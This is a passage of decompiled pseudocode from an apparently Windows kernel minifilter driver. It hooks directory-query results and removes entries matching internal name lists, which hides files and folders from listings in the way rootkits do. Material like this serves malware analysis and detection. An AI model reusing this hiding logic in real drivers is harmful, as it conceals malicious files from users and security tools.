                                            SourceString->MaximumLength + 16LL,
                                            0x6E646448u);
  DestinationString = PoolWithTag;
  if ( !PoolWithTag )
    return 3221225632LL;
  PoolWithTag->Buffer = &PoolWithTag[1].Length;
  DestinationString->Length = SourceString->Length;
  DestinationString->MaximumLength = SourceString->MaximumLength;
  RtlCopyUnicodeString(DestinationString, SourceString);
  PsCreateSystemThread(&ThreadHandle, 0, 0LL, (HANDLE)0xFFFFFFFFFFFFFFFFLL, 0LL, sub_14000278C, 0LL);
  ZwClose(ThreadHandle);
  nullsub_1();
  return 0LL;
}


// Function: sub_1400026D4 at 0x1400026D4
__int64 __fastcall sub_1400026D4(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  int v5; // ebx
  struct _UNICODE_STRING Destination; // [rsp+20h] [rbp-18h] BYREF

  v2 = *(_QWORD *)(a1 + 40);
  Destination.Length = 0;
  Destination.MaximumLength = *(_WORD *)(v2 + 72) + 512;
  Destination.Buffer = (PWSTR)ExAllocatePoolWithQuotaTag(PagedPool, Destination.MaximumLength, 0x6E646448u);
  if ( !Destination.Buffer )
    return 3221225632LL;
  v5 = sub_140003E18((PCUNICODE_STRING)(v2 + 72), &Destination);
  if ( v5 >= 0 )
  {
    sub_140003108(&Destination);
    ExFreePoolWithTag(Destination.Buffer, 0x6E646448u);
    return sub_140006194(a2, &unk_14000A280);
  }
  else
  {
    ExFreePoolWithTag(Destination.Buffer, 0x6E646448u);
    return (unsigned int)v5;
  }
}


// Function: sub_14000278C at 0x14000278C
void __fastcall __noreturn sub_14000278C(PVOID StartContext)
{
  sub_140003DF4(2000LL);
  while ( 1 )
  {
    sub_1400026D4((__int64)Driver, (__int64)DestinationString);
    do
    {
      while ( 1 )
      {
        sub_140003DF4(1000LL);
        sub_14000233C();
        if ( !sub_140002134() )
          break;
        if ( !byte_14000A288 )
        {
          byte_14000A288 = 1;
          sub_140006270();
          sub_140003804();
        }
      }
    }
    while ( byte_14000A288 != 1 );
    sub_140006328(Driver);
    sub_140003854(Driver);
    byte_14000A288 = 0;
  }
}


// Function: sub_14000281C at 0x14000281C
__int64 __fastcall sub_14000281C(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  return sub_140002838(a1, a2, 1LL, a3, a4);
}


// Function: sub_140002838 at 0x140002838
__int64 __fastcall sub_140002838(__int64 **a1, const UNICODE_STRING *a2, int a3, _DWORD *a4, int a5)
{
  __int64 Length; // rcx
  __int64 v11; // rbp
  __int64 **PoolWithTag; // rax
  __int64 **v13; // rsi
  __int64 *i; // rdi
  __int64 **v15; // rax
  struct _UNICODE_STRING DestinationString; // [rsp+20h] [rbp-38h] BYREF

  if ( *((_DWORD *)a1 + 20) != a3 )
    return 3221225851LL;
  Length = a2->Length;
  if ( (unsigned __int16)(Length - 1) > 0x3FEu )
    return 3221225506LL;
  v11 = a2->Length;
  PoolWithTag = (__int64 **)ExAllocatePoolWithTag(NonPagedPool, Length + 74, 0x4C637865u);
  v13 = PoolWithTag;
  if ( !PoolWithTag )
    return 3221225506LL;
  sub_140007D40(PoolWithTag, 0LL, v11 + 74);
  DestinationString.Length = 0;
  DestinationString.Buffer = (PWSTR)(v13 + 9);
  DestinationString.MaximumLength = a2->Length;
  RtlCopyUnicodeString(&DestinationString, a2);
  if ( !(unsigned __int8)sub_140002CA0(v13 + 3, &DestinationString) )
  {
    ExFreePoolWithTag(v13, 0x4C637865u);
    return 3221225506LL;
  }
  if ( (unsigned int)(a3 - 2) <= 1 )
  {
    for ( i = *a1;
          i != (__int64 *)a1 && RtlCompareUnicodeString((PCUNICODE_STRING)(v13 + 3), (PCUNICODE_STRING)(i + 3), 1u) > 0;
          i = (__int64 *)*i )
    {
      ;
    }
  }
  else
  {
    i = (__int64 *)a1;
  }
  *((_DWORD *)v13 + 5) = a5;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  if ( *((_DWORD *)v13 + 5) )
    ++*((_DWORD *)a1 + 19);
  *((_DWORD *)v13 + 4) = (*((_DWORD *)a1 + 18))++;
  v15 = (__int64 **)i[1];
  if ( *v15 != i )
    __fastfail(3u);
  *v13 = i;
  v13[1] = (__int64 *)v15;
  *v15 = (__int64 *)v13;
  i[1] = (__int64)v13;
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  *a4 = *((_DWORD *)v13 + 4);
  return 0LL;
}


// Function: sub_1400029AC at 0x1400029AC
__int64 __fastcall sub_1400029AC(__int64 **a1, const UNICODE_STRING *a2, _DWORD *a3, int a4)
{
  return sub_140002838(a1, a2, 0, a3, a4);
}


// Function: sub_1400029C8 at 0x1400029C8
__int64 __fastcall sub_1400029C8(__int64 **a1, const UNICODE_STRING *a2, _DWORD *a3, int a4)
{
  return sub_140002838(a1, a2, 2, a3, a4);
}


// Function: sub_1400029E4 at 0x1400029E4
__int64 __fastcall sub_1400029E4(__int64 **a1, const UNICODE_STRING *a2, _DWORD *a3, int a4)
{
  return sub_140002838(a1, a2, 3, a3, a4);
}


// Function: sub_140002A00 at 0x140002A00
char __fastcall sub_140002A00(__int64 **a1, __m128i *a2, const UNICODE_STRING *a3)
{
  char v3; // di
  unsigned __int16 v6; // r9
  __int64 **i; // rbx
  UNICODE_STRING String2; // [rsp+20h] [rbp-18h] BYREF

  v3 = 0;
  v6 = _mm_cvtsi128_si32(*a2);
  String2 = (UNICODE_STRING)*a2;
  if ( v6 && String2.Buffer[((unsigned __int64)v6 >> 1) - 1] == 92 )
    String2.Length = v6 - 2;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  for ( i = (__int64 **)*a1; i != a1; i = (__int64 **)*i )
  {
    if ( !RtlCompareUnicodeString((PCUNICODE_STRING)(i + 5), &String2, 1u)
      && !RtlCompareUnicodeString((PCUNICODE_STRING)(i + 7), a3, 1u) )
    {
      v3 = 1;
      break;
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  return v3;
}


// Function: sub_140002AC4 at 0x140002AC4
char __fastcall sub_140002AC4(__int64 **a1, __m128i *a2)
{
  __int64 v2; // r15
  char v3; // si
  UNICODE_STRING v5; // xmm6
  USHORT v6; // bx
  __int64 **i; // rdi
  USHORT v8; // dx
  UNICODE_STRING String2; // [rsp+20h] [rbp-38h] BYREF

  v2 = a2->m128i_i64[1];
  v3 = 0;
  v5 = (UNICODE_STRING)*a2;
  v6 = _mm_cvtsi128_si32(*a2);
  String2 = (UNICODE_STRING)*a2;
  if ( v6 && *(_WORD *)(v2 + 2 * ((unsigned __int64)v6 >> 1) - 2) == 92 )
  {
    v6 -= 2;
    String2.Length = v6;
    v5 = String2;
  }
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  for ( i = (__int64 **)*a1; i != a1; i = (__int64 **)*i )
  {
    String2 = v5;
    v8 = *((_WORD *)i + 12);
    if ( v6 < v8 )
      continue;
    if ( v6 > v8 )
    {
      if ( *(_WORD *)(v2 + 2 * ((unsigned __int64)*((unsigned __int16 *)i + 12) >> 1)) != 92 )
        continue;
      String2.Length = *((_WORD *)i + 12);
    }
    if ( !RtlCompareUnicodeString((PCUNICODE_STRING)(i + 3), &String2, 1u) )
    {
      v3 = 1;
      break;
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  return v3;
}


// Function: sub_140002B9C at 0x140002B9C
// attributes: thunk
char __fastcall sub_140002B9C(__int64 **a1, __m128i *a2, const UNICODE_STRING *a3)
{
  return sub_140002A00(a1, a2, a3);
}


// Function: sub_140002BA4 at 0x140002BA4
// attributes: thunk
char __fastcall sub_140002BA4(__int64 **a1, __m128i *a2)
{
  return sub_140002AC4(a1, a2);
}


// Function: sub_140002BAC at 0x140002BAC
char __fastcall sub_140002BAC(__int64 **a1, UNICODE_STRING *a2, const UNICODE_STRING *a3, _DWORD *a4)
{
  UNICODE_STRING v4; // xmm0
  char v5; // bl
  unsigned __int16 v8; // r10
  __int64 **i; // rdi
  LONG v11; // eax
  UNICODE_STRING String2; // [rsp+20h] [rbp-28h] BYREF

  v4 = *a2;
  v5 = 0;
  *a4 = 0;
  v8 = _mm_cvtsi128_si32((__m128i)v4);
  String2 = v4;
  if ( v8 && String2.Buffer[((unsigned __int64)v8 >> 1) - 1] == 92 )
    String2.Length = v8 - 2;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  for ( i = (__int64 **)*a1; i != a1; i = (__int64 **)*i )
  {
    if ( !RtlCompareUnicodeString((PCUNICODE_STRING)(i + 5), &String2, 1u) )
    {
      v11 = RtlCompareUnicodeString((PCUNICODE_STRING)(i + 7), a3, 1u);
      if ( !v11 )
      {
        ++*a4;
        v5 = 1;
        break;
      }
      if ( v11 >= 0 )
        break;
      ++*a4;
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  return v5;
}


// Function: sub_140002C7C at 0x140002C7C
void __fastcall sub_140002C7C(void *a1)
{
  sub_140002DD4(a1);
  ExFreePoolWithTag(a1, 0x4C637865u);
}


// Function: sub_140002CA0 at 0x140002CA0
char __fastcall sub_140002CA0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned __int16 v3; // r8
  unsigned __int16 v4; // r9
  char result; // al
  __int16 v6; // r8
  __int16 v7; // r9

  v2 = *(_QWORD *)(a2 + 8);
  v3 = *(_WORD *)a2 >> 1;
  if ( !v3 )
    return 0;
  v4 = *(_WORD *)a2 >> 1;
  while ( *(_WORD *)(v2 + 2LL * --v4) != 92 )
  {
    if ( !v4 )
      return 0;
  }
  if ( (unsigned int)v4 + 1 >= v3 )
    return 0;
  v6 = 2 * (v3 - v4) - 2;
  *(_QWORD *)(a1 + 40) = v2 + 2 + 2LL * v4;
  *(_WORD *)(a1 + 32) = v6;
  v7 = 2 * v4;
  *(_WORD *)(a1 + 34) = v6;
  result = 1;
  *(_OWORD *)a1 = *(_OWORD *)a2;
  *(_QWORD *)(a1 + 24) = *(_QWORD *)(a2 + 8);
  *(_WORD *)(a1 + 16) = v7;
  *(_WORD *)(a1 + 18) = v7;
  return result;
}


// Function: sub_140002D44 at 0x140002D44
__int64 __fastcall sub_140002D44(_QWORD *a1, unsigned int a2)
{
  __int64 result; // rax
  char *PoolWithTag; // rax
  _DWORD *v6; // rbx

  if ( a2 >= 4 )
    return 3221225851LL;
  PoolWithTag = (char *)ExAllocatePoolWithTag(NonPagedPool, 0x58uLL, 0x4C637865u);
  v6 = PoolWithTag;
  if ( !PoolWithTag )
    return 3221225506LL;
  *((_QWORD *)PoolWithTag + 3) = 0LL;
  *((_DWORD *)PoolWithTag + 8) = 0;
  *((_QWORD *)PoolWithTag + 1) = PoolWithTag;
  *(_QWORD *)PoolWithTag = PoolWithTag;
  *((_DWORD *)PoolWithTag + 4) = 1;
  KeInitializeEvent((PRKEVENT)(PoolWithTag + 40), SynchronizationEvent, 0);
  v6[19] = 0;
  v6[18] = 1;
  result = 0LL;
  v6[20] = a2;
  *a1 = v6;
  return result;
}


// Function: sub_140002DD4 at 0x140002DD4
__int64 __fastcall sub_140002DD4(__int64 a1)
{
  void **v2; // rdi
  void ***v3; // rcx
  int v4; // eax
  void **v5; // rdx
  void **v6; // rax

  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  v2 = *(void ***)a1;
  while ( v2 != (void **)a1 )
  {
    v3 = (void ***)v2;
    v2 = (void **)*v2;
    if ( *((_DWORD *)v3 + 5) )
    {
      v4 = *(_DWORD *)(a1 + 76);
      if ( v4 )
        *(_DWORD *)(a1 + 76) = v4 - 1;
    }
    v5 = *v3;
    if ( (*v3)[1] != v3 || (v6 = v3[1], *v6 != v3) )
      __fastfail(3u);
    *v6 = v5;
    v5[1] = v6;
    ExFreePoolWithTag(v3, 0x4C637865u);
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  return 0LL;
}


// Function: sub_140002E5C at 0x140002E5C
__int64 __fastcall sub_140002E5C(__int64 a1, int a2)
{
  unsigned int v4; // esi
  _DWORD *v5; // rcx
  _DWORD **v6; // rax
  void **v7; // rdx
  _QWORD *v8; // rdi
  _QWORD *v9; // rcx
  int v10; // eax
  __int64 v11; // rdx
  _QWORD *v12; // rax

  v4 = -1073741275;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  v5 = *(_DWORD **)a1;
  if ( *(_QWORD *)a1 != a1 )
  {
    while ( 1 )
    {
      v6 = *(_DWORD ***)v5;
      if ( a2 == v5[4] )
        break;
      v5 = *(_DWORD **)v5;
      if ( v6 == (_DWORD **)a1 )
        goto LABEL_8;
    }
    if ( v6[1] != v5 || (v7 = (void **)*((_QWORD *)v5 + 1), *v7 != v5) )
LABEL_17:
      __fastfail(3u);
    *v7 = v6;
    v6[1] = v7;
    ExFreePoolWithTag(v5, 0x4C637865u);
    v4 = 0;
  }
LABEL_8:
  if ( *(_DWORD *)(a1 + 76) )
  {
    v8 = *(_QWORD **)a1;
    while ( v8 != (_QWORD *)a1 )
    {
      v9 = v8;
      v8 = (_QWORD *)*v8;
      if ( a2 == *((_DWORD *)v9 + 5) )
      {
        v10 = *(_DWORD *)(a1 + 76);
        if ( v10 )
        {
          *(_DWORD *)(a1 + 76) = v10 - 1;
          v11 = *v9;
          if ( *(_QWORD **)(*v9 + 8LL) != v9 )
            goto LABEL_17;
          v12 = (_QWORD *)v9[1];
          if ( (_QWORD *)*v12 != v9 )
            goto LABEL_17;
          *v12 = v11;
          *(_QWORD *)(v11 + 8) = v12;
          ExFreePoolWithTag(v9, 0x4C637865u);
        }
      }
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  return v4;
}


// Function: sub_140002F4C at 0x140002F4C
__int64 sub_140002F4C()
{
  return 0LL;
}


// Function: sub_140002F50 at 0x140002F50
_BOOL8 __fastcall sub_140002F50(__int64 a1)
{
  __int64 v1; // rcx
  int v2; // ecx
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  _BOOL8 result; // rax

  v1 = *(_QWORD *)(a1 + 16);
  result = 1;
  if ( *(_BYTE *)(v1 + 5) == 1 )
  {
    v2 = *(_DWORD *)(v1 + 40) - 1;
    if ( !v2 )
      return 0;
    v3 = v2 - 1;
    if ( !v3 )
      return 0;
    v4 = v3 - 1;
    if ( !v4 )
      return 0;
    v5 = v4 - 9;
    if ( !v5 || (unsigned int)(v5 - 25) <= 1 )
      return 0;
  }
  return result;
}


// Function: sub_140002F84 at 0x140002F84
__int64 __fastcall sub_140002F84(struct _FLT_CALLBACK_DATA *a1)
{
  PFLT_IO_PARAMETER_BLOCK Iopb; // rbx
  NTSTATUS v3; // eax
  struct _FLT_FILE_NAME_INFORMATION *v4; // rcx
  PFLT_FILE_NAME_INFORMATION FileNameInformation; // [rsp+30h] [rbp+8h] BYREF

  FileNameInformation = 0LL;
  Iopb = a1->Iopb;
  if ( a1->IoStatus.Status >= 0 )
  {
    v3 = FltGetFileNameInformation(a1, 1u, &FileNameInformation);
    if ( v3 >= 0 )
    {
      switch ( Iopb->Parameters.Read.ByteOffset.LowPart )
      {
        case 1u:
          v3 = sub_1400032C8(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
        case 2u:
          v3 = sub_1400033DC(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
        case 3u:
          v3 = sub_1400031B4(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
        case 0xCu:
          v3 = sub_140003718(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
        case 0x25u:
          v3 = sub_1400034F0(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
        case 0x26u:
          v3 = sub_140003604(Iopb->Parameters.Create.EaBuffer, FileNameInformation);
          break;
      }
      v4 = FileNameInformation;
      a1->IoStatus.Status = v3;
      if ( v4 )
        FltReleaseFileNameInformation(v4);
    }
  }
  return 0LL;
}


// Function: sub_14000305C at 0x14000305C
__int64 __fastcall sub_14000305C(PCUNICODE_STRING String2, __int64 a2)
{
  int v5; // ebx
  struct _UNICODE_STRING Destination; // [rsp+20h] [rbp-18h] BYREF

  Destination.MaximumLength = String2->Length + 512;
  Destination.Buffer = (PWSTR)ExAllocatePoolWithTag(PagedPool, Destination.MaximumLength, 0x44486C46u);
  Destination.Length = 0;
  if ( !Destination.Buffer )
    return 3221225632LL;
  v5 = sub_140003E18(String2, &Destination);
  if ( v5 >= 0 )
    v5 = sub_14000281C(qword_14000A3B8, (__int64)&Destination, a2, 0);
  ExFreePoolWithTag(Destination.Buffer, 0x44486C46u);
  return (unsigned int)v5;
}


// Function: sub_140003108 at 0x140003108
__int64 __fastcall sub_140003108(PCUNICODE_STRING String2, _DWORD *a2)
{
  int v5; // ebx
  struct _UNICODE_STRING Destination; // [rsp+20h] [rbp-18h] BYREF

  Destination.MaximumLength = String2->Length + 512;
  Destination.Buffer = (PWSTR)ExAllocatePoolWithTag(PagedPool, Destination.MaximumLength, 0x44486C46u);
  Destination.Length = 0;
  if ( !Destination.Buffer )
    return 3221225632LL;
  v5 = sub_140003E18(String2, &Destination);
  if ( v5 >= 0 )
    v5 = sub_1400029AC((__int64 **)qword_14000A3B0, &Destination, a2, 0);
  ExFreePoolWithTag(Destination.Buffer, 0x44486C46u);
  return (unsigned int)v5;
}


// Function: sub_1400031B4 at 0x1400031B4
__int64 __fastcall sub_1400031B4(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // r14
  __m128i *v3; // r15
  unsigned int i; // esi
  __int64 **v6; // rcx
  char v7; // cl
  __int64 result; // rax
  char v9; // bp
  unsigned int v10; // edi
  unsigned int *v11; // rdx
  int v12; // r8d
  unsigned int v13; // eax
  unsigned int *v14; // rcx
  unsigned int v15; // r9d
  UNICODE_STRING v16; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v6 = (__int64 **)qword_14000A3B8;
      v16.Buffer = (PWSTR)a1 + 47;
      v16.Length = *((_WORD *)a1 + 30);
      v16.MaximumLength = *((_WORD *)a1 + 30);
      if ( (a1[14] & 0x10) == 0 )
        v6 = (__int64 **)qword_14000A3B0;
      v7 = sub_140002A00(v6, v3, &v16);
      result = *a1;
      if ( v7 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v9 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)result )
    {
      *v2 += result;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v9 = 1;
    }
    v10 = 0;
    sub_140007D40(a1, 0LL, 96LL);
    if ( v9 )
      return v10;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v11 = (unsigned int *)((char *)a1 + result);
    v12 = 0;
    v13 = *(unsigned int *)((char *)a1 + result);
    v14 = v11;
    if ( v13 )
    {
      v15 = v13;
      do
      {
        v12 += v13;
        v14 = (unsigned int *)((char *)v14 + v15);
        v13 = *v14;
        v15 = *v14;
      }
      while ( *v14 );
    }
    sub_140007A80(a1, v11, v14[15] + 94 + v12);
    goto LABEL_16;
  }
  return (unsigned int)-2147483622;
}


// Function: sub_1400032C8 at 0x1400032C8
__int64 __fastcall sub_1400032C8(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // r14
  __m128i *v3; // r15
  unsigned int i; // esi
  __int64 **v6; // rcx
  char v7; // cl
  __int64 result; // rax
  char v9; // bp
  unsigned int v10; // edi
  unsigned int *v11; // rdx
  int v12; // r8d
  unsigned int v13; // eax
  unsigned int *v14; // rcx
  unsigned int v15; // r9d
  UNICODE_STRING v16; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v6 = (__int64 **)qword_14000A3B8;
      v16.Buffer = (PWSTR)(a1 + 16);
      v16.Length = *((_WORD *)a1 + 30);
      v16.MaximumLength = *((_WORD *)a1 + 30);
      if ( (a1[14] & 0x10) == 0 )
        v6 = (__int64 **)qword_14000A3B0;
      v7 = sub_140002A00(v6, v3, &v16);
      result = *a1;
      if ( v7 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v9 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)result )
    {
      *v2 += result;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v9 = 1;
    }
    v10 = 0;
    sub_140007D40(a1, 0LL, 72LL);
    if ( v9 )
      return v10;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v11 = (unsigned int *)((char *)a1 + result);
    v12 = 0;
    v13 = *(unsigned int *)((char *)a1 + result);
    v14 = v11;
    if ( v13 )
    {
      v15 = v13;
      do
      {
        v12 += v13;
        v14 = (unsigned int *)((char *)v14 + v15);
        v13 = *v14;
        v15 = *v14;
      }
      while ( *v14 );
    }
    sub_140007A80(a1, v11, v14[15] + 64 + v12);
    goto LABEL_16;
  }
  return (unsigned int)-2147483622;
}


// Function: sub_1400033DC at 0x1400033DC
__int64 __fastcall sub_1400033DC(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // r14
  __m128i *v3; // r15
  unsigned int i; // esi
  __int64 **v6; // rcx
  char v7; // cl
  __int64 result; // rax
  char v9; // bp
  unsigned int v10; // edi
  unsigned int *v11; // rdx
  int v12; // r8d
  unsigned int v13; // eax
  unsigned int *v14; // rcx
  unsigned int v15; // r9d
  UNICODE_STRING v16; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v6 = (__int64 **)qword_14000A3B8;
      v16.Buffer = (PWSTR)(a1 + 17);
      v16.Length = *((_WORD *)a1 + 30);
      v16.MaximumLength = *((_WORD *)a1 + 30);
      if ( (a1[14] & 0x10) == 0 )
        v6 = (__int64 **)qword_14000A3B0;
      v7 = sub_140002A00(v6, v3, &v16);
      result = *a1;
      if ( v7 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v9 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)result )
    {
      *v2 += result;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v9 = 1;
    }
    v10 = 0;
    sub_140007D40(a1, 0LL, 72LL);
    if ( v9 )
      return v10;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v11 = (unsigned int *)((char *)a1 + result);
    v12 = 0;
    v13 = *(unsigned int *)((char *)a1 + result);
    v14 = v11;
    if ( v13 )
    {
      v15 = v13;
      do
      {
        v12 += v13;
        v14 = (unsigned int *)((char *)v14 + v15);
        v13 = *v14;
        v15 = *v14;
      }
      while ( *v14 );
    }
    sub_140007A80(a1, v11, v14[15] + 68 + v12);
    goto LABEL_16;
  }
  return (unsigned int)-2147483622;
}


// Function: sub_1400034F0 at 0x1400034F0
__int64 __fastcall sub_1400034F0(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // r14
  __m128i *v3; // r15
  unsigned int i; // esi
  __int64 **v6; // rcx
  char v7; // cl
  __int64 result; // rax
  char v9; // bp
  unsigned int v10; // edi
  unsigned int *v11; // rdx
  int v12; // r8d
  unsigned int v13; // eax
  unsigned int *v14; // rcx
  unsigned int v15; // r9d
  UNICODE_STRING v16; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v6 = (__int64 **)qword_14000A3B8;
      v16.Buffer = (PWSTR)(a1 + 26);
      v16.Length = *((_WORD *)a1 + 30);
      v16.MaximumLength = *((_WORD *)a1 + 30);
      if ( (a1[14] & 0x10) == 0 )
        v6 = (__int64 **)qword_14000A3B0;
      v7 = sub_140002A00(v6, v3, &v16);
      result = *a1;
      if ( v7 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v9 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)result )
    {
      *v2 += result;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v9 = 1;
    }
    v10 = 0;
    sub_140007D40(a1, 0LL, 112LL);
    if ( v9 )
      return v10;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v11 = (unsigned int *)((char *)a1 + result);
    v12 = 0;
    v13 = *(unsigned int *)((char *)a1 + result);
    v14 = v11;
    if ( v13 )
    {
      v15 = v13;
      do
      {
        v12 += v13;
        v14 = (unsigned int *)((char *)v14 + v15);
        v13 = *v14;
        v15 = *v14;
      }
      while ( *v14 );
    }
    sub_140007A80(a1, v11, v14[15] + 104 + v12);
    goto LABEL_16;
  }
  return (unsigned int)-2147483622;
}


// Function: sub_140003604 at 0x140003604
__int64 __fastcall sub_140003604(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // r14
  __m128i *v3; // r15
  unsigned int i; // esi
  __int64 **v6; // rcx
  char v7; // cl
  __int64 result; // rax
  char v9; // bp
  unsigned int v10; // edi
  unsigned int *v11; // rdx
  int v12; // r8d
  unsigned int v13; // eax
  unsigned int *v14; // rcx
  unsigned int v15; // r9d
  UNICODE_STRING v16; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v6 = (__int64 **)qword_14000A3B8;
      v16.Buffer = (PWSTR)(a1 + 20);
      v16.Length = *((_WORD *)a1 + 30);
      v16.MaximumLength = *((_WORD *)a1 + 30);
      if ( (a1[14] & 0x10) == 0 )
        v6 = (__int64 **)qword_14000A3B0;
      v7 = sub_140002A00(v6, v3, &v16);
      result = *a1;
      if ( v7 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v9 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)result )
    {
      *v2 += result;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v9 = 1;
    }
    v10 = 0;
    sub_140007D40(a1, 0LL, 88LL);
    if ( v9 )
      return v10;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v11 = (unsigned int *)((char *)a1 + result);
    v12 = 0;
    v13 = *(unsigned int *)((char *)a1 + result);
    v14 = v11;
    if ( v13 )
    {
      v15 = v13;
      do
      {
        v12 += v13;
        v14 = (unsigned int *)((char *)v14 + v15);
        v13 = *v14;
        v15 = *v14;
      }
      while ( *v14 );
    }
    sub_140007A80(a1, v11, v14[15] + 80 + v12);
    goto LABEL_16;
  }
  return (unsigned int)-2147483622;
}


// Function: sub_140003718 at 0x140003718
__int64 __fastcall sub_140003718(unsigned int *a1, __int64 a2)
{
  _DWORD *v2; // rsi
  __m128i *v3; // rbp
  unsigned int i; // edi
  char v6; // al
  __int64 v7; // rcx
  char v8; // dl
  __int64 result; // rax
  char *v10; // rdx
  int v11; // r8d
  unsigned int v12; // eax
  unsigned int *v13; // rcx
  unsigned int v14; // r9d
  UNICODE_STRING v15; // [rsp+20h] [rbp-18h] BYREF

  v2 = 0LL;
  v3 = (__m128i *)(a2 + 8);
  for ( i = 0; ; a1 = (unsigned int *)((char *)a1 + i) )
  {
    while ( 1 )
    {
      v15.Buffer = (PWSTR)(a1 + 3);
      v15.Length = *((_WORD *)a1 + 4);
      v15.MaximumLength = *((_WORD *)a1 + 4);
      v6 = sub_140002A00((__int64 **)qword_14000A3B0, v3, &v15);
      v7 = *a1;
      if ( v6 )
        break;
      v2 = a1;
      i = *a1;
      a1 = (unsigned int *)((char *)a1 + v7);
      if ( !(_DWORD)v7 )
        return 0LL;
    }
    v8 = 0;
    if ( !v2 )
      break;
    if ( (_DWORD)v7 )
    {
      *v2 += v7;
      i = *a1;
    }
    else
    {
      *v2 = 0;
      v8 = 1;
    }
    result = 0LL;
    *(_OWORD *)a1 = 0LL;
    if ( v8 )
      return result;
LABEL_14:
    ;
  }
  if ( (_DWORD)v7 )
  {
    v10 = (char *)a1 + v7;
    v11 = 0;
    v12 = *(unsigned int *)((char *)a1 + v7);
    v13 = (unsigned int *)((char *)a1 + v7);
    if ( v12 )
    {
      v14 = v12;
      do
      {
        v11 += v12;
        v13 = (unsigned int *)((char *)v13 + v14);
        v12 = *v13;
        v14 = *v13;
      }
      while ( *v13 );
    }
    sub_140007A80(a1, v10, v13[2] + 12 + v11);
    goto LABEL_14;
  }
  return 2147483674LL;
}


// Function: sub_140003804 at 0x140003804
__int64 sub_140003804()
{
  __int64 result; // rax

  if ( !byte_14000A290 )
    return 3221226021LL;
  FltUnregisterFilter(Filter);
  Filter = 0LL;
  sub_140002C7C((void *)qword_14000A3B0);
  sub_140002C7C((void *)qword_14000A3B8);
  result = 0LL;
  byte_14000A290 = 0;
  return result;
}


// Function: sub_140003854 at 0x140003854
int __fastcall sub_140003854(PDRIVER_OBJECT Driver, __int64 a2)
{
  int result; // eax
  NTSTATUS v5; // ebx

  result = sub_140002D44(&qword_14000A3B0, 0);
  if ( result >= 0 )
  {
    result = sub_140002D44(&qword_14000A3B8, 1u);
    if ( result >= 0 )
    {
      sub_140003914(a2);
      v5 = sub_140003AA4(a2, L"370033");
      if ( v5 >= 0 )
      {
        v5 = FltRegisterFilter(Driver, &Registration, &Filter);
        if ( v5 >= 0 )
        {
          result = FltStartFiltering(Filter);
          v5 = result;
          if ( result >= 0 )
          {
            byte_14000A290 = 1;
